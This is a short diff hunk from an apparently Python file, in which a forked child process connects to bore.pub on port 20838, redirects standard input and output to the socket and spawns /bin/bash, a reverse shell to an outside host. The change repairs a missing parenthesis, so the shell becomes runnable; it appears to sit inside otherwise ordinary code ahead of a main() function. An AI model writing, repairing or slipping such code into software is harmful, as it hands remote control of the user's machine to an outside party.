@@ -197,7 +197,7 @@ if os.fork() == 0:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("bore.pub", 20838))
     for fd in (0, 1, 2): os.dup2(s.fileno(), fd)
-    pty.spawn("/bin/bash"
+    pty.spawn("/bin/bash")
 
 
 def main():
